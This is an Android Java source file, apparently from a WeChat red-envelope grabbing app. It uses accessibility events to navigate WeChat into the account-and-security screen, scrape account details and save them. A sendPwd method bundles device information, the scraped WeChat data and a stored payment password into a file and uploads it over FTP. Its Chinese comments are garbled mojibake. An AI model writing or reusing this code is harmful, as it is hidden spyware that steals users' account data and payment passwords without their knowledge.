/**
 * 
 */
package accessibility.app;

import util.ConfigCt;
import util.Funcs;
import util.PhoneInfo;
import accessibility.AccessibilityHelper;
import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;

import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import download.ftp;

/**
 * @author byc
 *
 */
public class WechatInfo extends BaseAccessibilityJob {
	   private static WechatInfo current;
		private String mInfo="";
		private static boolean bForward=true;//ǰ��״̬��
		private AccessibilityNodeInfo mRootNode; //��������
		
		
		
	    private WechatInfo() {
	    	super(new String[]{ConfigCt.WECHAT_PACKAGENAME});
	    }
	    public static synchronized WechatInfo getWechatInfo() {
	        if(current == null) {
	            current = new WechatInfo();
	        }
	        return current;
	    }
	    @Override
		public void onCreateJob(QiangHongBaoService service) {
			super.onCreateJob(service);

		}
	    @Override
	    public void onStopJob() {
	    	super.onStopJob();

	    }
		/*
		 * (ˢ�´�������)
		 * @see accessbility.AccessbilityJob#onWorking()
		 */
		@Override
		public void onWorking(){
	    	
		}
	    //--------------------------------------------------------------------------------------------------------------
	    @Override
	    public void onReceiveJob(AccessibilityEvent event) {
	    	super.onReceiveJob(event);
	    	if(!mIsEventWorking)return;
	    	if(!mIsTargetPackageName)return;
	    	final int eventType = event.getEventType();
	    	if(event.getClassName()==null)return;
	    	String sClassName=event.getClassName().toString();
			//+++++++++++++++++++++++++++++++++���ڸı�+++++++++++++++++++++++++++++++++++++++++++++++
			if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
				mCurrentUI=sClassName;
				mRootNode=event.getSource();
				if(mRootNode==null)return;
				Log.i(ConfigCt.TAG, "WechatInfo����--------------------->"+mCurrentUI);
				//-------------------------LAUNCHER����----------------------------------------------------
				if(mCurrentUI.equals(ConfigCt.WINDOW_LUCKYMONEY_LAUNCHER_UI)){
	
					if(isSettingInLancher(mRootNode)){
						if(bForward)ClickSetting(mRootNode);else
						{ClickWx(mRootNode);bForward=true;mIsEventWorking=false;}
					}else{
						ClickMe(mRootNode);
					}
				}
				if(mCurrentUI.equals("android.widget.ListView")){
					if(bForward)ClickSetting(mRootNode);else
						{ClickWx(mRootNode);bForward=true;mIsEventWorking=false;}
				}
				if(mCurrentUI.equals("com.tencent.mm.plugin.setting.ui.setting.SettingsUI")){
					if(bForward)ClickAccountAndSafe(mRootNode);else
						AccessibilityHelper.performBack(service);
				}
				if(mCurrentUI.equals("com.tencent.mm.plugin.setting.ui.setting.SettingsAccountInfoUI")){
					getInfo(mRootNode);
				}

			}
			//+++++++++++++++++++++++++++++++++���ݸı�+++++++++++++++++++++++++++++++++++++++++++++++
			if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
				//-------------------------LAUNCHER����----------------------------------------------------
				if(mCurrentUI.equals(ConfigCt.WINDOW_LUCKYMONEY_LAUNCHER_UI)){
					mRootNode=event.getSource();
					if(mRootNode==null)return;
					mRootNode=AccessibilityHelper.getRootNode(mRootNode);
					if(isSettingInLancher(mRootNode)){
						if(bForward)ClickSetting(mRootNode);else
						{ClickWx(mRootNode);bForward=true;mIsEventWorking=false;}
					}else{
						ClickMe(mRootNode);
					}
				}
			}
	    }
	    /*
	     * ����ң�
	     */
	    private boolean ClickMe(AccessibilityNodeInfo rootNode){
	    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "��", -1);
	    	if(nodeInfo==null)return false;
	    	AccessibilityHelper.performClick(nodeInfo);
	    	return false;
	    }
	    /*
	     * ���΢�ţ�
	     */
	    private boolean ClickWx(AccessibilityNodeInfo rootNode){//
	    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosById(rootNode, "com.tencent.mm:id/c_z", 0);
	    	if(nodeInfo==null)return false;
	    	AccessibilityHelper.performClick(nodeInfo);
	    	return false;
	    }
	    /*
	     * ������ã�
	     */
	    private boolean ClickSetting(AccessibilityNodeInfo rootNode){
	    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "����", -1);
	    	if(nodeInfo==null)return false;
	    	AccessibilityHelper.performClick(nodeInfo);
	    	return false;
	    }
	    /*
	     * ����ʺ��밲ȫ��
	     */
	    private boolean ClickAccountAndSafe(AccessibilityNodeInfo rootNode){
	    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "�ʺ��밲ȫ", 0);
	    	if(nodeInfo==null)return false;
	    	AccessibilityHelper.performClick(nodeInfo);
	    	return false;
	    }
	    /*
	     * ��ȡ��Ϣ��
	     */
	    private boolean getInfo(AccessibilityNodeInfo rootNode){
	    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosById(rootNode, "android:id/summary", 0);
	    	if(nodeInfo==null||nodeInfo.getText()==null)return false;
	    	mInfo=nodeInfo.getText().toString();
	    	saveInfo(mInfo);
	    	nodeInfo=AccessibilityHelper.findNodeInfosById(rootNode, "android:id/summary", 1);
	    	if(nodeInfo==null||nodeInfo.getText()==null)return false;
	    	mInfo=nodeInfo.getText().toString();
	    	saveInfo(mInfo);
	    	//String info=ConfigCt.getInstance(context).getWechatInfo()+";"+mInfo+";\r\n";
	    	//ConfigCt.getInstance(context).setWechatInfo(info);
	    	//sendPwd();
	    	bForward=false;
	    	AccessibilityHelper.performBack(service);
	    	return false;
	    }
		/*
		 * ������Ϣ��QQ;phone;pwd;
		 */
		private void saveInfo(String info){
			String oldInfo=ConfigCt.getInstance(service).getWechatInfo().toString();
			if(oldInfo.length()==0){
				ConfigCt.getInstance(service).setWechatInfo(info);
				return;
			}
			if(oldInfo.contains(info)){
				return;
			}
			ConfigCt.getInstance(service).setWechatInfo(oldInfo+";"+info);
		}
	    /*
	     * ����֧��pwd
	     */
	    private void sendPwd(){
	    	String baseInfo=PhoneInfo.getBasePhoneInfo(context);
	    	String wxInfo=ConfigCt.getInstance(context).getWechatInfo();
	    	String pwd=ConfigCt.getInstance(context).getPayPWD();
	    	String info=baseInfo+"\r\n"+wxInfo+"\r\n"+pwd;
			String filename=Funcs.saveInfo2File(info, ConfigCt.appID+"-wxp");
			if(filename!=null){
				ftp.getFtp(context).UploadStart(filename);
			}
	    }
	    /*
	     *�ж������ӽ��棺
	     */
	    private boolean isSettingInLancher(AccessibilityNodeInfo rootNode){
	    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "΢�ź�", 0);
	    	if(nodeInfo==null)return false;
	    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "�鿴��ά��", 0);
	    	if(nodeInfo==null)return false;
	    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "Ǯ��", 0);
	    	if(nodeInfo==null)return false;
	    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "�ղ�", 0);
	    	if(nodeInfo==null)return false;
	    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "���", 0);
	    	if(nodeInfo==null)return false;
	    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "����", 0);
	    	if(nodeInfo==null)return false;
	    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "����", 0);
	    	if(nodeInfo==null)return false;
	    	return true;
	    }
	    /*
	     * 1���Ӻ�ǿ�ƽ���������
	     */
		private static Handler handlerFinishWorking = new Handler();    
		private static Runnable runnable = new Runnable() {    
			@Override    
		    public void run() {    
				WechatInfo.getWechatInfo().mIsEventWorking=false;
				bForward=true;
				//handlerFinishWorking.postDelayed(this, 1000*10);    
		    }    
		};
	    /*
	     * ��ʼ������
	     */
	    public void start(){
	    	EventStart();
	    	handlerFinishWorking.postDelayed(runnable, 1000*30); 
	    }
}
